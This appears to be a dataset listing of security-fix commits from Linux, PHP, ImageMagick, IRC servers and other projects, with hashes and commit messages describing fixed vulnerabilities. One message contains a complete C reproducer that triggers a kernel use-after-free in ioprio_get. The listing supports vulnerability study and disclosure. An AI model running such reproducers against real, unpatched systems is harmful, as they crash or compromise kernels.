    5f77a8e93830bd30cef60e68354bda683c9acc43
Blob(s) Before Fix: 
    245330ca0015c2fd2548ead861d379714151c901
    29822d6dd91ec3637cbca205de3c450d19ec5651
    418795caa8979fd0eb5d19e4d1fe3376fc0e9b20
    884e3299769840c3e05c43f1320ba849a10ad73c
    95ee7d8682e7447f45f5ddb0ddbde5fff196c84e
    9963a0b53a642f4ce600018606d1b8cb9982df9e
    abf56b2a14f9bc0a9f7c83fbcabaa2e97b3eca37
    bbedbfcb42c2505fceb57fa058f262d90e1670ed
    c044d1e8508cc2ba147c001897e4c9c26cc1a7e5
    c5ddc52cf2b29b7ec0de0c792697ee1edecaca5c
    d730ef9dfbf02aba150d5229a0d2875ddc23aa4d
    db13ae893dce7a479d55e08667fd81c03a3172eb
    dd2c247c99e30a7950323c85e1ea9cb604eac218
    fe20c319a0bb37dd475b7a8a32dccd57ac4e15d9
Projects:
    0-T-0_ps4-linux
Commit Message for 34b88a68f26a75e4fded796f1a49c40f82234b7d:
net: Fix use after free in the recvmmsg exit path\n\nThe syzkaller fuzzer hit the following use-after-free:\n\n  Call Trace:    [<ffffffff8175ea0e>] __asan_report_load8_noabort+0x3e/0x40 mm/kasan/report.c:295    [<ffffffff851cc31a>] __sys_recvmmsg+0x6fa/0x7f0 net/socket.c:2261    [<     inline     >] SYSC_recvmmsg net/socket.c:2281    [<ffffffff851cc57f>] SyS_recvmmsg+0x16f/0x180 net/socket.c:2270    [<ffffffff86332bb6>] entry_SYSCALL_64_fastpath+0x16/0x7a   arch/x86/entry/entry_64.S:185\n\nAnd, as Dmitry rightly assessed, that is because we can drop the reference and then touch it when the underlying recvmsg calls return some packets and then hit an error, which will make recvmmsg to set sock->sk->sk_err, oops, fix it.\n\nReported-and-Tested-by: Dmitry Vyukov <dvyukov@google.com> Cc: Alexander Potapenko <glider@google.com> Cc: Eric Dumazet <edumazet@google.com> Cc: Kostya Serebryany <kcc@google.com> Cc: Sasha Levin <sasha.levin@oracle.com> Fixes: a2e2725541fa ("net: Introduce recvmmsg socket syscall") http://lkml.kernel.org/r/20160122211644.GC2470@redhat.com Signed-off-by: Arnaldo Carvalho de Melo <acme@redhat.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    c2a13ced4272f2e65d2773e2ea6ca11c1ce4a911
File(s) In Commit: 
    Zend/zend_alloc.c
Blob(s) In Commit: 
    a79d67b4b996a9dba52003590b2ad1a20dabb820
Blob(s) Before Fix: 
    105c2560aaf7a8df08577f522690a6185f45c0cc
    18765593174f613f3ba29b1edab4301be449b31f
    1f00414939c9aa321072c532a697f71380ef24f0
Projects:
    0014593_php-src
Commit Message for c2a13ced4272f2e65d2773e2ea6ca11c1ce4a911:
Fix bug #72742 - memory allocator fails to realloc small block to large one

======================================================================
Commit With Fix: 
    72dbb7f416160f490c4e9987040989a10ad431c7
File(s) In Commit: 
    ext/curl/interface.c
Blob(s) In Commit: 
    7069710ece192683350f64700c5d991d10bf994f
Blob(s) Before Fix: 
    062f9969aed2a31390a86b2d12ea636305919ac6
    6a616411ef6c382e9a89dc651cd697771140362a
    7d085de73cccebe987dd0416248d4acda143986e
    be15785cd0e9c5babb6abc43742c3961ce0c6a71
Projects:
    0014593_php-src
Commit Message for 72dbb7f416160f490c4e9987040989a10ad431c7:
Fix bug #72674 - check both curl_escape and curl_unescape

======================================================================
Commit With Fix: 
    74fafb7f11b06747f69f182ad5e3769b665eea7a
File(s) In Commit: 
    src/modules/m_sasl.cpp
Blob(s) In Commit: 
    16a15357f57e9eef8720a34d1a3caf01a723324a
Blob(s) Before Fix: 
    9cb5592d1f8d1e2c1af817739d02c9d7552107a3
Projects:
    0x277F_inspircd
Commit Message for 74fafb7f11b06747f69f182ad5e3769b665eea7a:
m_sasl: don't allow AUTHENTICATE with mechanisms with a space

======================================================================
Commit With Fix: 
    818a3fda944b26d4814132cee14cfda4ea4aa824
File(s) In Commit: 
    modules/m_sasl.c
Blob(s) In Commit: 
    93c5a04124f3ee7f5bce71dfd65ced91749c532e
Blob(s) Before Fix: 
    38c7baeb3a27348c2f8314d4e8189aaf38df35a6
Projects:
    0re5ama_ircd-seven
Commit Message for 818a3fda944b26d4814132cee14cfda4ea4aa824:
SASL: Disallow beginning : and space anywhere in AUTHENTICATE parameter\n\nThis is a FIX FOR A SECURITY VULNERABILITY. All Charybdis users must apply this fix if you support SASL on your servers, or unload m_sasl.so in the meantime.

======================================================================
Commit With Fix: 
    f473e355e1dc422c4f019dbf86bc50ba1a34a766
File(s) In Commit: 
    src/modules/m_sasl.c
Blob(s) In Commit: 
    b53818a96ff59c082a777cb43a316c9dc350930a
Blob(s) Before Fix: 
    51ed0eae75b3a18097752c220c6973f1693f1520
Projects:
    Adam-_unrealircd
Commit Message for f473e355e1dc422c4f019dbf86bc50ba1a34a766:
Fix AUTHENTICATE bug

======================================================================
Commit With Fix: 
    f50a84bad996d438e7b31b9e74c32a41e43f8be5
File(s) In Commit: 
    ircd/m_authenticate.c
Blob(s) In Commit: 
    f8960bd54da617d368a6e9d634d72f613780db6c
Blob(s) Before Fix: 
    99ed9ef05b6e8d27973c3fb056a132a7dd4904c9
Projects:
    0re5ama_ircd-seven
Commit Message for f50a84bad996d438e7b31b9e74c32a41e43f8be5:
Fix to prevent SASL security vulnerability

======================================================================
Commit With Fix: 
    dd975fff7fce81bf12f9c59edb1a99475747c83c
File(s) In Commit: 
    skins_site/_site_body_header.inc.php
Blob(s) In Commit: 
    99e63b9a906d93308f30f845efc1914aa71e034b
Blob(s) Before Fix: 
    70e3c21796ba1b2908b4889dec1ad854dfcf65b7
Projects:
    Acidburn0zzz_b2evolution
Commit Message for dd975fff7fce81bf12f9c59edb1a99475747c83c:
Fix XSS vulnerability on "site name"

======================================================================
Commit With Fix: 
    87a25bb543c8e4c09b48d4b4a6c7db31ce58df06
File(s) In Commit: 
    arch/X86/X86Mapping.c
Blob(s) In Commit: 
    a9d8980f33449cb3172ff2604f10773b81754c1f
Blob(s) Before Fix: 
    61c9ce4304b2819574d1deb421f7a50be3dad8f6
Projects:
    0vercl0k_capstone
Commit Message for 87a25bb543c8e4c09b48d4b4a6c7db31ce58df06:
x86: fast path checking for X86_insn_reg_intel()

======================================================================
Commit With Fix: 
    bd9eca9f40220f9918ec3cc7ae9ef422b3e448b8
File(s) In Commit: 
    drivers/adodb-pdo.inc.php
Blob(s) In Commit: 
    63a3e6e04e1839e8f478bbe02186ca48c98c068f
Blob(s) Before Fix: 
    e3f49a4f24c6af91a91d37a9202e72e2d67893b5
Projects:
    10n_ADOdb
Commit Message for bd9eca9f40220f9918ec3cc7ae9ef422b3e448b8:
PDO: fix incorrect quoting allowing SQL injection\n\nThe PDO driver was relying on ADOConnection::qstr() for quoting strings. An application relying on qstr() to manually prepare SQL statements rather than using parameterized queries may be vulnerable to SQL injection attacks, as demonstrated by @jdavidlists.\n\nThis commit delegates string quoting to PDO::quote() when a connection is available. If not, it simply replaces single quotes by the value of $replaceQuote property.\n\nFixes #226

======================================================================
Commit With Fix: 
    28f80baf3c53e267c9ce46a2a0fadbb981585132
File(s) In Commit: 
    ext/mysqlnd/mysqlnd_wireprotocol.c
Blob(s) In Commit: 
    855a25cea1c0b50b535f51e57c7b50eab915c2f7
Blob(s) Before Fix: 
    74c97249912d32003fa8200b4c95d9b7e2d5541f
Projects:
    0014593_php-src
Commit Message for 28f80baf3c53e267c9ce46a2a0fadbb981585132:
Fix bug #72293 - Heap overflow in mysqlnd related to BIT fields

======================================================================
Commit With Fix: 
    6d55ba265637d6adf0ba7e9c9ef11187d1ec2f5b
File(s) In Commit: 
    ext/intl/msgformat/msgformat_format.c
Blob(s) In Commit: 
    9b6df38ee398951292c2d85f4cdc2bca0545f475
Blob(s) Before Fix: 
    25c9619133d6fe8d6cd32d2702b0eb4cf829efe2
    55ec9e84ba0e8ed5243c59cf0481e0efd5d653b0
    cb74a3fb1bb547838b4c5f27a7a839fd42770544
Projects:
    0014593_php-src
Commit Message for 6d55ba265637d6adf0ba7e9c9ef11187d1ec2f5b:
Fix bug #73007: add locale length check

======================================================================
Commit With Fix: 
    6933d27afe518967bd1b60e6a7eacd88288929fc
File(s) In Commit: 
    js/vendor/owncloud/share.js
Blob(s) In Commit: 
    2569f5b6c922d56bc8a85f01d4370fb004e46d15
Blob(s) Before Fix: 
    4c1d49bc98aeb77374f5f9d5ceb5a55834f4520e
    b31b28cfbc5602143feeb454dfb030673f091554
Projects:
    0xb0ba_gallery
Commit Message for 6933d27afe518967bd1b60e6a7eacd88288929fc:
Add more escaping\n\nEscape folder names in share.js

======================================================================
Commit With Fix: 
    7bc2b55a5c030685b399bb65b6baa9ccc3d1f167
File(s) In Commit: 
    drivers/scsi/arcmsr/arcmsr_hba.c
Blob(s) In Commit: 
    110eca9eaca05c7c5400aa67e2832dceaa04b7db
Blob(s) Before Fix: 
    333db5953607e49b284f780f1b4532c81fe5ea01
    7640498964a5bb1169d676b20056497b6c705e15
    b13764ca23fdfc9d272fd780c0bd6dc121ac9a24
Projects:
    0-T-0_ps4-linux
Commit Message for 7bc2b55a5c030685b399bb65b6baa9ccc3d1f167:
scsi: arcmsr: Buffer overflow in arcmsr_iop_message_xfer()\n\nWe need to put an upper bound on "user_len" so the memcpy() doesn't overflow.\n\nCc: <stable@vger.kernel.org> Reported-by: Marco Grassi <marco.gra@gmail.com> Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com> Reviewed-by: Tomas Henzl <thenzl@redhat.com> Signed-off-by: Martin K. Petersen <martin.petersen@oracle.com>

======================================================================
Commit With Fix: 
    c1092f167cc6c78dc8bf9bf149946c5219413df3
File(s) In Commit: 
    framework/modules/pixidou/controllers/pixidouController.php
Blob(s) In Commit: 
    14afb2284a05f677efb5f691da9cef5b28f04984
Blob(s) Before Fix: 
    f6bf2b8a8c877abd2c079fb81b25d61025e9650a
Projects:
    nwtn_exponent-cms
Commit Message for c1092f167cc6c78dc8bf9bf149946c5219413df3:
security fix to pixidou editor

======================================================================
Commit With Fix: 
    c1092f167cc6c78dc8bf9bf149946c5219413df3
File(s) In Commit: 
    framework/modules/pixidou/controllers/pixidouController.php
Blob(s) In Commit: 
    14afb2284a05f677efb5f691da9cef5b28f04984
Blob(s) Before Fix: 
    f6bf2b8a8c877abd2c079fb81b25d61025e9650a
Projects:
    nwtn_exponent-cms
Commit Message for c1092f167cc6c78dc8bf9bf149946c5219413df3:
security fix to pixidou editor

======================================================================
Commit With Fix: 
    a54fe0e8600eaf3dc6fe717d3c0398001507f723
File(s) In Commit: 
    magick/cache.c
Blob(s) In Commit: 
    369c52caff1795ac3140634ef1ee0f99e4f8836f
Blob(s) Before Fix: 
    70921c4fa5b336e5ff777d54456195afea284750
Projects:
    2016repotsheyue_ImageMagick
Commit Message for a54fe0e8600eaf3dc6fe717d3c0398001507f723:


======================================================================
Commit With Fix: 
    2ad6d33493750a28a5a655d319a8e0b16c392de1
File(s) In Commit: 
    coders/rle.c
Blob(s) In Commit: 
    9809fa7f29935efe336541ae873394b3b2188ece
Blob(s) Before Fix: 
    a5c27ffaf72acc40207fbe1ca7c68f9b6cbc1911
Projects:
    2016repotsheyue_ImageMagick
Commit Message for 2ad6d33493750a28a5a655d319a8e0b16c392de1:
Fixed check for the number of pixels that will be allocated.

======================================================================
Commit With Fix: 
    14e606db148d6ebcaae20f1e1d6d71903ca4a556
File(s) In Commit: 
    coders/hdr.c
Blob(s) In Commit: 
    bdb343b1195d9be4cf059c809652fa25cbe84236
Blob(s) Before Fix: 
    aeb5df03003eb00b8abc0521771dbbb70aa17308
    b15c415be36973b9d98c15af4a7c06a13c6de2e0
Projects:
    2016repotsheyue_ImageMagick
Commit Message for 14e606db148d6ebcaae20f1e1d6d71903ca4a556:
https://bugs.launchpad.net/ubuntu/+source/imagemagick/+bug/1537213

======================================================================
Commit With Fix: 
    30eec879c8b446b0ea9a3bb0da1a441cc8482bc4
File(s) In Commit: 
    coders/psd.c
Blob(s) In Commit: 
    9f69d8a7123344418bee4b1c2827ef4f0088d0ee
Blob(s) Before Fix: 
    11d26ea8526bc6ef61e225b0b7706ea08e4ebfd3
Projects:
    2016repotsheyue_ImageMagick
Commit Message for 30eec879c8b446b0ea9a3bb0da1a441cc8482bc4:
Moved check for https://github.com/ImageMagick/ImageMagick/issues/92.

======================================================================
Commit With Fix: 
    4b1b9c0522628887195bad3a6723f7000b0c9a58
File(s) In Commit: 
    coders/psd.c
Blob(s) In Commit: 
    47c6bcf735ca86c035240dbb25a741ef3fbc0cea
Blob(s) Before Fix: 
    9f69d8a7123344418bee4b1c2827ef4f0088d0ee
Projects:
    2016repotsheyue_ImageMagick
Commit Message for 4b1b9c0522628887195bad3a6723f7000b0c9a58:
Added extra check to fix https://github.com/ImageMagick/ImageMagick/issues/93

======================================================================
Commit With Fix: 
    5f16640725b1225e6337c62526e6577f0f88edb8
File(s) In Commit: 
    coders/psd.c
Blob(s) In Commit: 
    d8fd9503113ba75c208bbbaa6f56d0eb39c34db3
Blob(s) Before Fix: 
    ba9bbba660e6f2ef1c9ef5525f1933d03dc7a8a0
Projects:
    2016repotsheyue_ImageMagick
Commit Message for 5f16640725b1225e6337c62526e6577f0f88edb8:
Fixed head buffer overflow reported in: https://github.com/ImageMagick/ImageMagick/issues/98

======================================================================
Commit With Fix: 
    a2e1064f288a353bc5fef7f79ccb7683759e775c
File(s) In Commit: 
    coders/xcf.c
Blob(s) In Commit: 
    b8075bb682389650c8d2677f90fff10d1f46bf2c
Blob(s) Before Fix: 
    0fdc54656184df0c73e3bc29443da8a0519a8142
Projects:
    2016repotsheyue_ImageMagick
Commit Message for a2e1064f288a353bc5fef7f79ccb7683759e775c:
https://github.com/ImageMagick/ImageMagick/issues/104

======================================================================
Commit With Fix: 
    4f2c04ea6673863b87ac7f186cbb0d911f74085c
File(s) In Commit: 
    coders/psd.c
Blob(s) In Commit: 
    ba9bbba660e6f2ef1c9ef5525f1933d03dc7a8a0
Blob(s) Before Fix: 
    47c6bcf735ca86c035240dbb25a741ef3fbc0cea
Projects:
    2016repotsheyue_ImageMagick
Commit Message for 4f2c04ea6673863b87ac7f186cbb0d911f74085c:
Added check for out of bounds read (https://github.com/ImageMagick/ImageMagick/issues/108).

======================================================================
Commit With Fix: 
    bef1e4f637d8f665bc133a9c6d30df08d983bc3a
File(s) In Commit: 
    coders/wpg.c
Blob(s) In Commit: 
    b01dcf9cc63aba8cd8137ab71fa15b2e256fd727
Blob(s) Before Fix: 
    964530533ea4a7d62048454b5f68bd95176d57c2
Projects:
    2016repotsheyue_ImageMagick
Commit Message for bef1e4f637d8f665bc133a9c6d30df08d983bc3a:
https://github.com/ImageMagick/ImageMagick/issues/120

======================================================================
Commit With Fix: 
    82e2049862a8b8a999e160734ad64fb6cc3b145f
File(s) In Commit: 
    coders/psd.c
Blob(s) In Commit: 
    1f63ec79eb2cb51a0653e568fada1c053c9b1f15
Blob(s) Before Fix: 
    ca3ebae3851dba23df22772653701d34ae89ea84
Projects:
    2016repotsheyue_ImageMagick
Commit Message for 82e2049862a8b8a999e160734ad64fb6cc3b145f:
https://github.com/ImageMagick/ImageMagick/issues/148

======================================================================
Commit With Fix: 
    4e81ce8b07219c69a9aeccb0f7f7b927ca6db74c
File(s) In Commit: 
    magick/cache.c
Blob(s) In Commit: 
    0e4e482f8d7fd92ebcc3d2e34f70d15b52acf121
Blob(s) Before Fix: 
    3eab0b0f4af6880f816b3d3c0642caa4bed4c166
Projects:
    2016repotsheyue_ImageMagick
Commit Message for 4e81ce8b07219c69a9aeccb0f7f7b927ca6db74c:
http://www.imagemagick.org/discourse-server/viewtopic.php?f=2&t=28946

======================================================================
Commit With Fix: 
    a0108a892f9ea3c2bb1e7a49b7d71376c2ecbff7
File(s) In Commit: 
    coders/rgf.c
Blob(s) In Commit: 
    e572f96d2441183b2e45850a6f8096f4ab2cc2b3
Blob(s) Before Fix: 
    461443854b77a15140c7ff57e6ab7c078987651d
Projects:
    2016repotsheyue_ImageMagick
Commit Message for a0108a892f9ea3c2bb1e7a49b7d71376c2ecbff7:
Fix abort when writing to rgf format\n\nThe rgf format (LEGO MINDSTORMS EV3 images) caused a software abort because exception == NULL. When WriteRGFImage is called from WriteImage, it is only passed two parameters, not three. So, removed the extra parameter and use image->exception instead as in other coders.

======================================================================
Commit With Fix: 
    acca96a135a4d2a028ba9b636886af99c0915379
File(s) In Commit: 
    policycoreutils/sandbox/sandbox
Blob(s) In Commit: 
    07c340cc4d1e932f29c7cf79e020fa262b62aa77
Blob(s) Before Fix: 
    9cc13c27879e901dc02ad878d97860bb09b4b6b4
Projects:
    0-T-0_ps4-linux
    0-kaladin_build
    0-kaladin_system_core
    00day0_android_frameworks_base
Commit Message for acca96a135a4d2a028ba9b636886af99c0915379:
sandbox: create a new session for sandboxed processes\n\nIt helps to prevent sandboxed processes to inject arbitrary commands into the parent.\n\nSigned-off-by: Petr Lautrbach <plautrba@redhat.com>

======================================================================
Commit With Fix: 
    f1b1eb154baa684fad5d65bf4dff79c8ded8b65a
File(s) In Commit: 
    scripts/buf.pl
Blob(s) In Commit: 
    6d907f127188e21322cd4deb220ed0b20cc79b25
Blob(s) Before Fix: 
    43b4b3dda5ccf504ee4b158d558e5445c8dbdf4d
    da50e8219260157095af99dab812ba977db35ae0
Projects:
    Astalaseven_scripts.irssi.org
Commit Message for f1b1eb154baa684fad5d65bf4dff79c8ded8b65a:
Fix disclosure via filesystem\n\nbuf.pl restores the scrollbuffer between "/upgrade"s by writing the contents to a file, and reading that after the new process was spawned. Through that file, the contents of (private) chat conversations may leak to other users.\n\nCareful users with a limited umask (e.g. 077) are not affected by this bug. However, most Linux systems default to a umask of 022, meaning that files written without further restricting the permissions, are readable by any user.\n\nThis patch sets a safer umask of 077 for the scrollbuffer dump, and will remove the temporary file after use to further reduce the attack surface. Additionally, it will remove any remaining temporary scrollbuffer file left in place, like those written by previous versions of the script.

======================================================================
Commit With Fix: 
    4ae457ff1bf80e8b61286cd125ca794b25564e86
File(s) In Commit: 
    install/index.php
Blob(s) In Commit: 
    0e440ab2d754eb0a52c14bac369be955e8f507a4
Blob(s) Before Fix: 
    a638a5151f4cd2e396cbf84b87bd5373fd5c568e
Projects:
    nwtn_exponent-cms
Commit Message for 4ae457ff1bf80e8b61286cd125ca794b25564e86:
security fix to prevent possible hacking by moving security checks earlier in the install code

======================================================================
Commit With Fix: 
    5ec24a2642bd0854b884d1a9b51d12371373b410
File(s) In Commit: 
    lrmd/tls_backend.c
Blob(s) In Commit: 
    0e0782869a9068d72fc1609cc2bfab3da39041c1
Blob(s) Before Fix: 
    fd316e42ad8b2d3a4f373b69484ba760bee19667
Projects:
    359887612_pacemaker
Commit Message for 5ec24a2642bd0854b884d1a9b51d12371373b410:
Fix: remote: cl#5269 - Notify other clients of a new connection only if the handshake has completed (bsc#967388)

======================================================================
Commit With Fix: 
    a7bb158b7bedd1449a34432feb3a67c8f1873bfa
File(s) In Commit: 
    MagickCore/profile.c
Blob(s) In Commit: 
    4239d558c6e377159779e5fa927b5e8249abc44e
Blob(s) Before Fix: 
    ea76057700b987ad268adfb01dca1264bf59ccb0
Projects:
    2016repotsheyue_ImageMagick
Commit Message for a7bb158b7bedd1449a34432feb3a67c8f1873bfa:
https://github.com/ImageMagick/ImageMagick/issues/280

======================================================================
Commit With Fix: 
    bb454857348245a7397f9e4fbb3a902f4ac25913
File(s) In Commit: 
    src/updatedownloader.cpp
Blob(s) In Commit: 
    b6893305a82934c8272fec3ab6db1897d00a7a08
Blob(s) Before Fix: 
    72b36642a8fcc76a8ea0e01fad557cb62c58706d
Projects:
    57-Wolve_winsparkle
Commit Message for bb454857348245a7397f9e4fbb3a902f4ac25913:
Verify UpdateTempDir isn't maliciously modified\n\nDon't just delete the stored updates temporary directory on launch, but validate the registry key to ensure it is in an expected location and follows WinSparkle's naming convention. This is to prevent malicious users from modifying this registry key and forcing the host app to delete arbitrary directories (a user being able to delete the key would be able to delete the directory themselves, so it's not a serious issue, but it nevertheless is bad behavior and shouldn't be possible).

======================================================================
Commit With Fix: 
    90406972f108c4da71f998601b06abdc2ac6f06e
File(s) In Commit: 
    MagickCore/attribute.c
Blob(s) In Commit: 
    f6510b7bf318451a4a2326632aead2a9c53f7747
Blob(s) Before Fix: 
    717e7f6901903e40bd80d5421ec9153debf79930
    d9f088ad7584590b7c7b8c1eedec073f2983616f
Projects:
    2016repotsheyue_ImageMagick
Commit Message for 90406972f108c4da71f998601b06abdc2ac6f06e:
https://github.com/ImageMagick/ImageMagick/issues/281

======================================================================
Commit With Fix: 
    77da160530dd1dc94f6ae15a981f24e5f0021e84
File(s) In Commit: 
    block/genhd.c
Blob(s) In Commit: 
    0ad879655f825789934609f45cb7d1e9840bcc78
Blob(s) Before Fix: 
    3c9dede4e04f9a1f3f6c446affc68c8694b01db1
Projects:
    0-T-0_ps4-linux
Commit Message for 77da160530dd1dc94f6ae15a981f24e5f0021e84:
block: fix use-after-free in seq file\n\nI got a KASAN report of use-after-free:\n\n    ==================================================================     BUG: KASAN: use-after-free in klist_iter_exit+0x61/0x70 at addr ffff8800b6581508     Read of size 8 by task trinity-c1/315     =============================================================================     BUG kmalloc-32 (Not tainted): kasan: bad access detected     -----------------------------------------------------------------------------\n\n    Disabling lock debugging due to kernel taint     INFO: Allocated in disk_seqf_start+0x66/0x110 age=144 cpu=1 pid=315             ___slab_alloc+0x4f1/0x520             __slab_alloc.isra.58+0x56/0x80             kmem_cache_alloc_trace+0x260/0x2a0             disk_seqf_start+0x66/0x110             traverse+0x176/0x860             seq_read+0x7e3/0x11a0             proc_reg_read+0xbc/0x180             do_loop_readv_writev+0x134/0x210             do_readv_writev+0x565/0x660             vfs_readv+0x67/0xa0             do_preadv+0x126/0x170             SyS_preadv+0xc/0x10             do_syscall_64+0x1a1/0x460             return_from_SYSCALL_64+0x0/0x6a     INFO: Freed in disk_seqf_stop+0x42/0x50 age=160 cpu=1 pid=315             __slab_free+0x17a/0x2c0             kfree+0x20a/0x220             disk_seqf_stop+0x42/0x50             traverse+0x3b5/0x860             seq_read+0x7e3/0x11a0             proc_reg_read+0xbc/0x180             do_loop_readv_writev+0x134/0x210             do_readv_writev+0x565/0x660             vfs_readv+0x67/0xa0             do_preadv+0x126/0x170             SyS_preadv+0xc/0x10             do_syscall_64+0x1a1/0x460             return_from_SYSCALL_64+0x0/0x6a\n\n    CPU: 1 PID: 315 Comm: trinity-c1 Tainted: G    B           4.7.0+ #62     Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Ubuntu-1.8.2-1ubuntu1 04/01/2014      ffffea0002d96000 ffff880119b9f918 ffffffff81d6ce81 ffff88011a804480      ffff8800b6581500 ffff880119b9f948 ffffffff8146c7bd ffff88011a804480      ffffea0002d96000 ffff8800b6581500 fffffffffffffff4 ffff880119b9f970     Call Trace:      [<ffffffff81d6ce81>] dump_stack+0x65/0x84      [<ffffffff8146c7bd>] print_trailer+0x10d/0x1a0      [<ffffffff814704ff>] object_err+0x2f/0x40      [<ffffffff814754d1>] kasan_report_error+0x221/0x520      [<ffffffff8147590e>] __asan_report_load8_noabort+0x3e/0x40      [<ffffffff83888161>] klist_iter_exit+0x61/0x70      [<ffffffff82404389>] class_dev_iter_exit+0x9/0x10      [<ffffffff81d2e8ea>] disk_seqf_stop+0x3a/0x50      [<ffffffff8151f812>] seq_read+0x4b2/0x11a0      [<ffffffff815f8fdc>] proc_reg_read+0xbc/0x180      [<ffffffff814b24e4>] do_loop_readv_writev+0x134/0x210      [<ffffffff814b4c45>] do_readv_writev+0x565/0x660      [<ffffffff814b8a17>] vfs_readv+0x67/0xa0      [<ffffffff814b8de6>] do_preadv+0x126/0x170      [<ffffffff814b92ec>] SyS_preadv+0xc/0x10\n\nThis problem can occur in the following situation:\n\nopen()  - pread()     - .seq_start()        - iter = kmalloc() // succeeds        - seqf->private = iter     - .seq_stop()        - kfree(seqf->private)  - pread()     - .seq_start()        - iter = kmalloc() // fails     - .seq_stop()        - class_dev_iter_exit(seqf->private) // boom! old pointer\n\nAs the comment in disk_seqf_stop() says, stop is called even if start failed, so we need to reinitialise the private pointer to NULL when seq iteration stops.\n\nAn alternative would be to set the private pointer to NULL when the kmalloc() in disk_seqf_start() fails.\n\nCc: stable@vger.kernel.org Signed-off-by: Vegard Nossum <vegard.nossum@oracle.com> Acked-by: Tejun Heo <tj@kernel.org> Signed-off-by: Jens Axboe <axboe@fb.com>

======================================================================
Commit With Fix: 
    8ba8682107ee2ca3347354e018865d8e1967c5f4
File(s) In Commit: 
    block/ioprio.c
Blob(s) In Commit: 
    01b8116298a13b5463e7969ce66c0b037bcfccd5
Blob(s) Before Fix: 
    0c47a00f92a852542dc11be132a30d44e9af055c
    31666c92b46af29919f42ea3e1093caed7127d71
    563435684c3c15aa87b4fe3b73813b205fa18275
    6f5d0b6625e39b930d93aca15082daec481f0199
    77bcab11dce5794531abf58f1d6e7957ea06c887
    cc7800e9eb441e2b7737a152f0dbb60182821408
    e50170ca7c33f446acc16e29a0d0097828919c30
    f9821080c92ccbc242ef9d2f819d06588c3d7fe9
Projects:
    0-T-0_ps4-linux
Commit Message for 8ba8682107ee2ca3347354e018865d8e1967c5f4:
block: fix use-after-free in sys_ioprio_get()\n\nget_task_ioprio() accesses the task->io_context without holding the task lock and thus can race with exit_io_context(), leading to a use-after-free. The reproducer below hits this within a few seconds on my 4-core QEMU VM:\n\n#define _GNU_SOURCE #include <assert.h> #include <unistd.h> #include <sys/syscall.h> #include <sys/wait.h>\n\nint main(int argc, char **argv) { 	pid_t pid, child  	long nproc, i \n\n	/* ioprio_set(IOPRIO_WHO_PROCESS, 0, IOPRIO_PRIO_VALUE(IOPRIO_CLASS_IDLE, 0))  */ 	syscall(SYS_ioprio_set, 1, 0, 0x6000) \n\n	nproc = sysconf(_SC_NPROCESSORS_ONLN) \n\n	for (i = 0  i < nproc  i++) { 		pid = fork()  		assert(pid != -1)  		if (pid == 0) { 			for (  ) { 				pid = fork()  				assert(pid != -1)  				if (pid == 0) { 					_exit(0)  				} else { 					child = wait(NULL)  					assert(child == pid)  				} 			} 		}\n\n		pid = fork()  		assert(pid != -1)  		if (pid == 0) { 			for (  ) { 				/* ioprio_get(IOPRIO_WHO_PGRP, 0)  */ 				syscall(SYS_ioprio_get, 2, 0)  			} 		} 	}\n\n	for (  ) { 		/* ioprio_get(IOPRIO_WHO_PGRP, 0)  */ 		syscall(SYS_ioprio_get, 2, 0)  	}\n\n	return 0  }\n\nThis gets us KASAN dumps like this:\n\n[   35.526914] ================================================================== [   35.530009] BUG: KASAN: out-of-bounds in get_task_ioprio+0x7b/0x90 at addr ffff880066f34e6c [   35.530009] Read of size 2 by task ioprio-gpf/363 [   35.530009] ============================================================================= [   35.530009] BUG blkdev_ioc (Not tainted): kasan: bad access detected [   35.530009] -----------------------------------------------------------------------------\n\n[   35.530009] Disabling lock debugging due to kernel taint [   35.530009] INFO: Allocated in create_task_io_context+0x2b/0x370 age=0 cpu=0 pid=360 [   35.530009] 	___slab_alloc+0x55d/0x5a0 [   35.530009] 	__slab_alloc.isra.20+0x2b/0x40 [   35.530009] 	kmem_cache_alloc_node+0x84/0x200 [   35.530009] 	create_task_io_context+0x2b/0x370 [   35.530009] 	get_task_io_context+0x92/0xb0 [   35.530009] 	copy_process.part.8+0x5029/0x5660 [   35.530009] 	_do_fork+0x155/0x7e0 [   35.530009] 	SyS_clone+0x19/0x20 [   35.530009] 	do_syscall_64+0x195/0x3a0 [   35.530009] 	return_from_SYSCALL_64+0x0/0x6a [   35.530009] INFO: Freed in put_io_context+0xe7/0x120 age=0 cpu=0 pid=1060 [   35.530009] 	__slab_free+0x27b/0x3d0 [   35.530009] 	kmem_cache_free+0x1fb/0x220 [   35.530009] 	put_io_context+0xe7/0x120 [   35.530009] 	put_io_context_active+0x238/0x380 [   35.530009] 	exit_io_context+0x66/0x80 [   35.530009] 	do_exit+0x158e/0x2b90 [   35.530009] 	do_group_exit+0xe5/0x2b0 [   35.530009] 	SyS_exit_group+0x1d/0x20 [   35.530009] 	entry_SYSCALL_64_fastpath+0x1a/0xa4 [   35.530009] INFO: Slab 0xffffea00019bcd00 objects=20 used=4 fp=0xffff880066f34ff0 flags=0x1fffe0000004080 [   35.530009] INFO: Object 0xffff880066f34e58 @offset=3672 fp=0x0000000000000001 [   35.530009] ==================================================================\n\nFix it by grabbing the task lock while we poke at the io_context.\n\nCc: stable@vger.kernel.org Reported-by: Dmitry Vyukov <dvyukov@google.com> Signed-off-by: Omar Sandoval <osandov@fb.com> Signed-off-by: Jens Axboe <axboe@fb.com>

======================================================================
Commit With Fix: 
    38740a5b87d53ceb89eb2c970150f6e94e00373a
File(s) In Commit: 
    drivers/usb/gadget/function/f_fs.c
Blob(s) In Commit: 
    15b648cbc75c4141bb5c51bd03c2c6e5b5f6c821
Blob(s) Before Fix: 
    175c9956cbe3a36949526029103d38b4c97225c3
    79d895c2dd715aaf1463ed05170ae6eec268eec7
    8cfce105c7eeb2ed516c28507553d038e89f33a6
    adc6d52efa4639387c30bcde2ae7cee95331b1bc
    af98b096af2fde060aea8978005e8ea620762566
    cf43e9e18368dcd84668b9378b1036b17276b593
    e21ca2bd6839eb6a8b73f6d1e2061dd36939bc65
Projects:
    0-T-0_ps4-linux
Commit Message for 38740a5b87d53ceb89eb2c970150f6e94e00373a:
